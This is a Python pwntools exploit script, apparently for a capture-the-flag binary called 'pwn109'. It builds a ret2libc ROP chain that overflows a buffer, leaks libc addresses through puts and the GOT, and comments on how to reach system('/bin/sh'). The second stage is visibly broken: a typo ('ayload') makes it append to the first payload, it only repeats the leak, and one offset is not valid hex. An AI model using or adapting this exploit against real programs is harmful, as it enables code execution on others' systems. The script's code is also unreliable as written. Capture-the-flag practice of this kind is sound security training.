from pwn import *

binary = context.binary = ELF('./pwn109', checksec=False)
#context.log_level = "debug"

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
#libc = ELF("libc6_2.27-3ubuntu1.4_amd64.so", checksec=False) 
#for remote found with libc.rip or libc.nullbyte.cat or libc.blukat.me 

#call puts to print functions that are already loaded.
#to resolve puts we have to call main again; so first overwrite the $rip with main address
#puts prints out whatever is loaded in the RDI register; so we need a gadget to load RDI.
#ropper -f ./pwn109 | grep rdi 
#result was 0x00000000004012a3: pop rdi; ret; 
# we can set poprdi = p64(0x00000000004012a3)
#or we can use pwn tools
rop = ROP(binary)
poprdi= rop.find_gadget(["pop rdi", "ret"])[0]
ret = rop.find_gadget(["ret"])[0]
print("poprdi@ ", hex(poprdi))
print("ret@ ", hex(ret))

#find the puts address;
#in ghidra got to the GOT in the assembly code
#it has a xref to puts at   PTR_puts_00404018     XREF[1]:     puts:00401064  
#so putsgot = 0x00404018 and putsplt = 0x00401064  
#or use the ELF function in pwns to find it so that:
pltputs = binary.plt.puts
print("pltputs@: ", hex(pltputs))
print("check = 0x00401064\n")
#now to finds the binary address of gotputs
gotputs = binary.got.puts
print("gotputs@: ", hex(gotputs))
print("check = 0x00404018\n")


#repackage for payload
poprdi = p64(poprdi)
ret = p64(ret)
pltputs = p64(pltputs)
gotputs = p64(gotputs)

#get address of main for second interation
mainaddr = binary.symbols.main
print(mainaddr)
mainaddr = p64(mainaddr)


#the other functions can be found the same way
gotgets = p64(binary.got.gets)
gotsetvbuf = p64(binary.got.setvbuf)

#PAYLOAD FIRST STAGE
#so we will overwrite the stack, then $RBP, then the $RIP with chained rop gadgets
#this will leak the GOT enteries of three functions using puts to print them out

payload = b"A" *0x20	#overwrite buffer
payload += b"B" *0x8	#overwrite $rbp

#to print the gotputs address:
payload += poprdi		#pop the next value into RDI
payload += gotputs		#this the next value for ^above^ is gotputs address
payload += pltputs		#now execute puts with the loaded RDI value

#to print the gotgets address:
payload += poprdi		#pop the next value into RDI
payload += gotgets		#this the next value for ^above^ is gotgets address
payload += pltputs		#now execute puts with the loaded RDI value

#to print the gotsetvbuf address:
payload += poprdi		#pop the next value into RDI
payload += gotsetvbuf	#this the next value for ^above^ is gotsetvbuf address
payload += pltputs		#now execute puts with the loaded RDI value
payload += mainaddr

p = process()
#p = remote("10.10.X.X., 9009)
p.recvuntil(b"ahead")
p.recv()	#this resolves the emoji
p.sendline(payload)
output = p.recv().split(b"\n")	#receive the output from puts and split by \n into output array.  use recvall instead of recv because with remote machines you might have buffering issues
#note that puts prints out until null byte so if there is a bad char null byte it can stop the output too early; just re-execute again
print(output[0], output[1], output[2])

lkdputsaddr = u64(output[0].ljust(8, b"\x00")) #unpacks the output[0], then left justifies it with x\00
lkdgetsaddr = u64(output[1].ljust(8, b"\x00"))
lkdsetvbufaddr = u64(output[2].ljust(8, b"\x00"))

print("Leaked puts: {}".format(str(hex(lkdputsaddr))))
print("Leaked gets: {}".format(str(hex(lkdgetsaddr))))
print("Leaked setvbuf: {}".format(str(hex(lkdsetvbufaddr))))

#so now we've leaked three legit addresses and note that despite ASLR, that last three nibbles remain the same no matter what!
#so only nibbles 3-9 are randonmized.  nibbles 1 and 2, and nibbles 10,11,12 remain consistent.
#on 32 bit you can brute it; but not on 64 bit.
#but each libc version has its own offset.
#so look for libc version; i.e. on this machine 
#Leaked puts: 0x7f94ce48b140
#Leaked gets: 0x7f94ce48a820
#Leaked setvbuf: 0x7f94ce48b760
# puts is 140, gets is 820, and setvbuf is 760.  check libc.nullbyte.cat or libc.blukat.me or libc.rip reveals these libc versions
#libc6-i386-amd64-cross_2.29-1cross7_all
#libc6-i386_2.29-0experimental1_amd64
#libc6-i386_2.29-1_amd64
#libc6-i386_2.29-2_amd64

#PAYLOAD 2ND STAGE

#so knowing the remote libc is libc6_2.27-3ubuntu1.4_amd64.so
#we can determine find the offsets to
#system 0x4f550			difference of 0x0
#gets is 0x80190		difference of 0x30c40
#str_bin_sh 0x1b3e1la	difference of 0x1648ca

#locally:str_bin_sh	0x1b1117 and system	0x4a4e0

#so for the second gets lets spawn a shell

#payload = b"A"*0x20
#payload += b"B"*0x8


ayload = b"A" *0x20	#overwrite buffer
payload += b"B" *0x8	#overwrite $rbp

#to print the gotputs address:
payload += poprdi		#pop the next value into RDI
payload += gotputs		#this the next value for ^above^ is gotputs address
payload += pltputs		#now execute puts with the loaded RDI value

#to print the gotgets address:
payload += poprdi		#pop the next value into RDI
payload += gotgets		#this the next value for ^above^ is gotgets address
payload += pltputs		#now execute puts with the loaded RDI value

#to print the gotsetvbuf address:
payload += poprdi		#pop the next value into RDI
payload += gotsetvbuf	#this the next value for ^above^ is gotsetvbuf address
payload += pltputs		#now execute puts with the loaded RDI value
#NO MAIN

p = process()
#p = remote("10.10.X.X., 9009)
p.recvuntil(b"ahead")
p.recv()	#this resolves the emoji
p.sendline(payload)
output = p.recvall().split(b"\n")	#receive the output from puts and split by \n into output array.  use recvall instead of recv because with remote machines you might have buffering issues
#note that puts prints out until null byte so if there is a bad char null byte it can stop the output too early; just re-execute again
print(output[0], output[1], output[2])

lkdputsaddr = u64(output[0].ljust(8, b"\x00")) #unpacks the output[0], then left justifies it with x\00
lkdgetsaddr = u64(output[1].ljust(8, b"\x00"))
lkdsetvbufaddr = u64(output[2].ljust(8, b"\x00"))

print("Leaked puts: {}".format(str(hex(lkdputsaddr))))
print("Leaked gets: {}".format(str(hex(lkdgetsaddr))))
print("Leaked setvbuf: {}".format(str(hex(lkdsetvbufaddr))))





